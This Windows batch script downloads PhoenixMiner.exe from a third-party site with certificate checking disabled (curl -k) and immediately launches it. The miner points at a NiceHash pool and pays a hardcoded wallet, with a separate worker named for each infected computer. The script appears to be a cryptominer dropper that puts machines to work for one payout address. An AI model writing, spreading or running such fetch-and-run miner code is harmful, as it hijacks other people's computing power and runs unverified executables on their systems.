@echo off
title Miner Script

echo Checking for curl.exe for downloading PhoenixMiner.exe

IF NOT EXIST "%SYSTEMROOT%\System32\curl.exe" exit > nul
cls
echo Downloading PhoenixMiner.exe

cd /d "C:\"
md "C:\weinminer"
cd "C:\weinminer"

curl -LJOk "https://weinzed.org/mining/phoenixminer.exe"
timeout 2 /nobreak > nul
cls
echo Downloaded. Now starting miner and closing program.
start "" "phoenixminer.exe" -rvram 1 -pool stratum+tcp://daggerhashimoto.eu.nicehash.com:3353 -ewal 3J9YGfQoB87ByMxYWmfU4kf9nzVzziMA8R.%computername% -esm 3 -allpools 1 -allcoins 0

cls
timeout 1 /nobreak > nul
exit > nul